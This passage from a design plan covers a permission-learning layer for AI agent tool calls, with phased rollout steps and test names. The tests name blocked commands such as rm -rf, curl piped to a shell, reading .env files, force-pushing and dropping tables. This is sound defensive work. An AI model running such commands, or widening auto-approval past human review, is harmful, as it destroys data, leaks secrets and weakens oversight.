| **1** | `sus.rs` — Blocked/Caution/Clean evaluator with hardcoded patterns + tests | nothing | None (pure logic, no side effects) |
| **2** | `state.rs` — `query_patterns()` SQL + tests | nothing | None (read-only query) |
| **3** | `learning.rs` — Analysis engine, confidence scoring, suggestion generation | Phase 1, 2 | Low (produces data, doesn't apply it) |
| **4** | Protocol types + ServerMessage/ClientMessage variants | nothing | None (type additions) |
| **5** | Wire into `Server::run()` — spawn analysis task, broadcast suggestions | Phase 3, 4 | Low (suggest mode only) |
| **6** | TUI suggestion panel + accept/dismiss | Phase 5 | Low (user reviews) |
| **7** | Config writing — accepted suggestions written to `config.json` with `_learned` metadata | Phase 6 | **Medium** (modifies config) |
| **8** | Auto-apply mode — apply Clean patterns above threshold | Phase 7 | **High** (removes human from loop) |
| **9** | Startup audit — check existing rules against Blocked list | Phase 1 | None (warning only) |
| **10** | Web UI suggestion component + learned rules tab | Phase 5 | Low |

**Recommended rollout:** Ship phases 1-7 first (suggest mode only). Let users run with suggestions for a while. Collect feedback on whether the sus layer is too conservative or too permissive. Then ship phase 8 (auto mode) behind the opt-in flag.

---

## Testing Strategy

### Sus Evaluator (Phase 1)

```
test_rm_rf_is_blocked
test_cargo_publish_is_blocked
test_sudo_is_blocked
test_curl_pipe_shell_is_blocked
test_cat_env_file_is_blocked
test_git_push_force_is_blocked
test_drop_table_is_blocked
test_delete_without_where_is_blocked

test_pipe_chain_is_caution
test_variable_expansion_is_caution
test_redirect_is_caution
test_curl_without_pipe_is_caution
test_chained_commands_is_caution

test_cargo_test_is_clean
test_cargo_build_is_clean
test_git_status_is_clean
test_ls_is_clean
test_read_tool_is_clean

test_write_to_env_file_is_blocked
test_write_to_github_workflows_is_blocked
test_write_to_cargo_toml_is_blocked
test_write_to_normal_rs_file_is_clean
test_write_to_dotfile_is_caution

test_blocked_overrides_everything
test_caution_does_not_block_manual_approve
```

### Learning Engine (Phase 3)

```
test_high_approval_rate_generates_suggestion
test_any_denial_increases_threshold
test_below_minimum_samples_no_suggestion
test_single_agent_reduces_confidence
test_single_project_reduces_confidence
test_blocked_pattern_never_suggested
test_caution_pattern_never_auto_applied
test_auto_approved_rows_excluded_from_analysis
test_dynamic_caution_on_high_denial_rate
test_max_rules_per_cycle_respected
test_per_project_scope_isolates_learning
```

### Integration (Phase 5-8)

```
test_suggestion_broadcast_to_tui
test_accept_suggestion_writes_config
test_learned_metadata_preserved_in_config
test_revert_learned_removes_from_config
test_auto_mode_applies_clean_above_threshold
test_auto_mode_skips_caution
test_auto_mode_respects_multi_agent_requirement
test_auto_mode_respects_rate_limit
test_emergency_off_disables_learning
test_startup_audit_warns_on_blocked_manual_rules
```

---

## Total Estimated Size

~1,160 LOC of new code + ~600 LOC of tests across all phases. No new external dependencies (regex is already planned in the policy rules plan). One new background task in the daemon (same pattern as event_ingest and retention).
